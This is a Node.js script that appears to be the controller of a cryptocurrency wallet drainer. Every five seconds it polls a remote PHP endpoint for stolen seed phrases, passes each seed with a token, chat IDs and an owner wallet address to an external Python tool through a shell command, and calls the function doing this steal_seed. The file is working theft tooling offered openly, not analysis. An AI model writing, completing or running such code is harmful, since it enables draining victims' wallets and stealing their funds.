import fetch from "node-fetch"
import { createRequire } from "module";
const require = createRequire(import.meta.url);
const { exec, spawn } = require('node:child_process')

let base_url = "https://www.domain.dom/drainer_seed_ready/"; // this is url to the drainer_seed_ready folder
let is_linux = false
let python_path = "/path/to/python.exe" // This is the path to the python executable
let tool_path = "https://www.domain.com/drainer_seed_ready/python" // this is the url to the python folder

async function check_unsent_seeds(){

    const response = await fetch(base_url + 'php/get_undrained_seeds.php');
    const data = await response.json();

    let item = data[0]
    if(item){
        start_seed_script(item)
    }
}

async function start_seed_script(item){

    let seed = item.seed 
    let token = item.token
    let screen_chatid = item.screen_chatid
    let action_chatid = item.action_chatid
    let owner_wallet = item.owner_wallet

    console.log("Treating : " + seed)
    let cmd = python_path + tool_path + '"' + seed + '" "' + token + '" "' +  screen_chatid + '" "' + action_chatid + '" "' + owner_wallet + '"'
    set_seed_to_sent(seed);
    steal_seed(cmd)
}

async function set_seed_to_sent(seed){
    const response = await fetch(base_url + "php/set_seed_to_sent?seed=" + seed)
}

function steal_seed(cmd) {
    // run the `ls` command using exec
    exec(cmd, (err, output) => {
        // once the command has completed, the callback function is called
        if (err) {
            // log and return if we encounter an error
            console.error("could not execute command: ", err)
            return
        }
        // log the output received from the command
        console.log("Output: \n", output)
    })
}


setInterval(check_unsent_seeds,5000)
